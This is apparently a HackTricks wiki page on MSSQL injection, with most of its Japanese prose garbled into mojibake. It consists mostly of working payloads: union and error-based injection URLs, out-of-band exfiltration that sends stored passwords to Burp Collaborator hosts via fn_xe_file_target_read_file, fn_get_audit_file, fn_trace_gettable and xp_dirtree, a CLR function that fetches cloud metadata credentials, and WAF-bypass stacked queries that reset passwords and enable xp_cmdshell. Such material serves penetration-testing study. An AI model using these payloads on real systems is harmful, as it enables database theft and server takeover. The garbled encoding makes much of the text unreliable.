# MSSQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Active Directory enumeration

**MSSQL**ã‚µãƒ¼ãƒãƒ¼å†…ã§SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦**ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ãªå ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®MSSQLé–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

* **`SELECT DEFAULT_DOMAIN()`**: ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å–å¾—ã—ã¾ã™ã€‚
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: ãƒ‰ãƒ¡ã‚¤ãƒ³åï¼ˆã“ã®ä¾‹ã§ã¯_DOMAIN_ï¼‰ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã€ã“ã®é–¢æ•°ã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼Administratorã®SID**ã‚’16é€²æ•°å½¢å¼ã§è¿”ã—ã¾ã™ã€‚ã“ã‚Œã¯`0x01050000000[...]0000f401`ã®ã‚ˆã†ã«è¦‹ãˆã€**æœ€å¾Œã®4ãƒã‚¤ãƒˆ**ãŒ**500**ã¨ã„ã†æ•°å€¤ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼administratorã®å…±é€šID**ã§ã™ã€‚\
ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ãƒ‰ãƒ¡ã‚¤ãƒ³ã®IDã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆæœ€å¾Œã®4ãƒã‚¤ãƒˆã‚’é™¤ãã™ã¹ã¦ã®ãƒã‚¤ãƒˆï¼‰ã€‚
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : ã“ã®é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸIDã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’è¿”ã—ã¾ã™**ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã€ã“ã®å ´åˆ**0000e803**ã¯ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§**1000**ï¼ˆé€šå¸¸ã€ã“ã‚Œã¯æœ€åˆã«ä½œæˆã•ã‚ŒãŸé€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã®IDã§ã™ï¼‰ã€‚æ¬¡ã«ã€1000ã‹ã‚‰2000ã¾ã§ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å–å¾—ã§ãã‚‹ã¨æƒ³åƒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ï¼š
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **ä»£æ›¿ã‚¨ãƒ©ãƒ¼ã«åŸºã¥ããƒ™ã‚¯ã‚¿ãƒ¼**

ã‚¨ãƒ©ãƒ¼ã«åŸºã¥ãSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€é€šå¸¸ã€`+AND+1=@@version--`ã®ã‚ˆã†ãªæ§‹æ–‡ã‚„ã€ŒORã€æ¼”ç®—å­ã«åŸºã¥ããƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã«ä¼¼ã¦ã„ã¾ã™ã€‚ã“ã®ã‚ˆã†ãªå¼ã‚’å«ã‚€ã‚¯ã‚¨ãƒªã¯ã€é€šå¸¸WAFã«ã‚ˆã£ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚ãƒã‚¤ãƒ‘ã‚¹ã¨ã—ã¦ã€%2bæ–‡å­—ã‚’ä½¿ç”¨ã—ã¦ã€æ±‚ã‚ã‚‰ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã«å¯¾ã—ã¦ãƒ‡ãƒ¼ã‚¿å‹å¤‰æ›ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™ç‰¹å®šã®é–¢æ•°å‘¼ã³å‡ºã—ã®çµæœã¨æ–‡å­—åˆ—ã‚’é€£çµã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ãªé–¢æ•°ã®ã„ãã¤ã‹ã®ä¾‹ï¼š

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

é–¢æ•°`USER_NAME()`ã®ä½¿ç”¨ä¾‹ï¼š
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

ã“ã‚Œã‚‰ã®SSRFãƒˆãƒªãƒƒã‚¯ã¯[ã“ã¡ã‚‰ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸ](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

ã‚µãƒ¼ãƒãƒ¼ä¸Šã§**`VIEW SERVER STATE`**æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

**`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

**`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

`xp_dirtree`ã®ã‚ˆã†ãªã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¯ã€Microsoftã«ã‚ˆã£ã¦å…¬å¼ã«æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ãªã„ã‚‚ã®ã®ã€MSSQLå†…ã§ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ“ä½œã«ãŠã‘ã‚‹æœ‰ç”¨æ€§ã‹ã‚‰ã€ä»–ã®äººã€…ã«ã‚ˆã£ã¦ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã§èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¯ã€ã•ã¾ã–ã¾ãª[ä¾‹](https://www.notsosecure.com/oob-exploitation-cheatsheet/)ã‚„[æŠ•ç¨¿](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)ã§ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ã‚¢ã‚¦ãƒˆã‚ªãƒ–ãƒãƒ³ãƒ‰ãƒ‡ãƒ¼ã‚¿ã®æŠ½å‡ºã«ã—ã°ã—ã°ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä¾‹ãˆã°ã€`xp_dirtree`ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ãŒã€TCPãƒãƒ¼ãƒˆ445ã®ã¿ã«åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒãƒ¼ãƒˆç•ªå·ã¯å¤‰æ›´ã§ãã¾ã›ã‚“ãŒã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å…±æœ‰ã‹ã‚‰ã®èª­ã¿å–ã‚Šã‚’è¨±å¯ã—ã¾ã™ã€‚ä½¿ç”¨æ³•ã¯ä»¥ä¸‹ã®SQLã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ç¤ºã•ã‚Œã¦ã„ã¾ã™ï¼š
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
ã“ã®æ–¹æ³•ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®šã® `Windows Server 2016 Datacenter` ä¸Šã§å‹•ä½œã™ã‚‹ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` ã®ã‚ˆã†ãªã™ã¹ã¦ã®ã‚·ã‚¹ãƒ†ãƒ æ§‹æˆã§æ©Ÿèƒ½ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚

ã•ã‚‰ã«ã€åŒæ§˜ã®çµæœã‚’å¾—ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ä»£æ›¿ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã¨ã—ã¦ `master..xp_fileexist` ã¨ `xp_subdirs` ãŒã‚ã‚Šã¾ã™ã€‚ `xp_fileexist` ã«é–¢ã™ã‚‹è©³ç´°ã¯ã€[ã“ã®TechNetè¨˜äº‹](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)ã§ç¢ºèªã§ãã¾ã™ã€‚

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

æ˜ã‚‰ã‹ã«ã€**`xp_cmdshell`** ã‚’ä½¿ç”¨ã—ã¦ **SSRF** ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ä½•ã‹ã‚’ **å®Ÿè¡Œ** ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ãƒšãƒ¼ã‚¸ã® **é–¢é€£ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’èª­ã‚€** ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL ãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

CLR UDFï¼ˆå…±é€šè¨€èªãƒ©ãƒ³ã‚¿ã‚¤ãƒ ãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•°ï¼‰ã‚’ä½œæˆã™ã‚‹ã“ã¨ã¯ã€ä»»æ„ã® .NET è¨€èªã§ä½œæˆã•ã‚Œã€DLL ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã€MSSQL å†…ã§ã‚«ã‚¹ã‚¿ãƒ é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å¿…è¦ã¨ã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã§ã‚ã‚Šã€`dbo` ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã¯é€šå¸¸ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šãŒ `sa` ã¾ãŸã¯ç®¡ç†è€…ãƒ­ãƒ¼ãƒ«ã§è¡Œã‚ã‚Œã‚‹å ´åˆã«ã®ã¿å®Ÿè¡Œå¯èƒ½ã§ã™ã€‚

ãƒã‚¤ãƒŠãƒªã‚’ CLR ã‚¢ã‚»ãƒ³ãƒ–ãƒªã¨ã—ã¦ MSSQL ã«ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã® Visual Studio ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã¯ã€[ã“ã®Githubãƒªãƒã‚¸ãƒˆãƒª](https://github.com/infiniteloopltd/SQLHttp)ã§æä¾›ã•ã‚Œã¦ãŠã‚Šã€ã“ã‚Œã«ã‚ˆã‚Š MSSQL å†…ã‹ã‚‰ HTTP GET ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ã“ã®æ©Ÿèƒ½ã®æ ¸å¿ƒã¯ `http.cs` ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚«ãƒ—ã‚»ãƒ«åŒ–ã•ã‚Œã¦ãŠã‚Šã€`WebClient` ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã—ã¦ GET ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å–å¾—ã—ã¾ã™ï¼š
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
`CREATE ASSEMBLY` SQLã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å‰ã«ã€æ¬¡ã®SQLã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’å®Ÿè¡Œã—ã¦ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®SHA512ãƒãƒƒã‚·ãƒ¥ã‚’ã‚µãƒ¼ãƒãƒ¼ã®ä¿¡é ¼ã•ã‚ŒãŸã‚¢ã‚»ãƒ³ãƒ–ãƒªã®ãƒªã‚¹ãƒˆã«è¿½åŠ ã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ï¼ˆ`select * from sys.trusted_assemblies;`ã§è¡¨ç¤ºå¯èƒ½ï¼‰ï¼š
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ã‚¢ã‚»ãƒ³ãƒ–ãƒªã‚’æ­£å¸¸ã«è¿½åŠ ã—ã€é–¢æ•°ã‚’ä½œæˆã—ãŸå¾Œã€æ¬¡ã®SQLã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **ã‚¯ã‚¤ãƒƒã‚¯ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³: å˜ä¸€ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«ã®å…¨å†…å®¹ã‚’å–å¾—ã™ã‚‹**

[ã“ã“ã‹ã‚‰ã®ãƒˆãƒªãƒƒã‚¯](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)ã€‚

å˜ä¸€ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«ã®å…¨å†…å®¹ã‚’æŠ½å‡ºã™ã‚‹ç°¡æ½”ãªæ–¹æ³•ã¯ã€`FOR JSON`å¥ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ç‰¹å®šã®ãƒ¢ãƒ¼ãƒ‰ã€Œrawã€ã‚’å¿…è¦ã¨ã™ã‚‹`FOR XML`å¥ã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã‚Šã‚‚ç°¡æ½”ã§ã™ã€‚`FOR JSON`å¥ã¯ã€ãã®ç°¡æ½”ã•ã‹ã‚‰å¥½ã¾ã‚Œã¾ã™ã€‚

ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚¹ã‚­ãƒ¼ãƒã€ãƒ†ãƒ¼ãƒ–ãƒ«ã€ãŠã‚ˆã³ã‚«ãƒ©ãƒ ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```markdown
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:

```
```markdown
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
use [tempdb]  
create table [test] ([id] int)  
insert [test] values(1)  
select [id] from [test]  
drop table[test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# ç„¡é§„ãª exec() ã‚’æœ€å¾Œã«è¿½åŠ ã—ã¦ WAF ã«ã“ã‚ŒãŒæœ‰åŠ¹ãªã‚¯ã‚¨ãƒªã§ã¯ãªã„ã¨æ€ã‚ã›ã‚‹
admina'union select 1,'admin','testtest123'exec('select 1')--
## ã“ã‚Œã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# å¥‡å¦™ã«æ§‹ç¯‰ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã™ã‚‹
admin'exec('update[users]set[password]=''a''')--
## ã“ã‚Œã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# ã¾ãŸã¯ xp_cmdshell ã‚’æœ‰åŠ¹ã«ã™ã‚‹
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## ã“ã‚Œã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
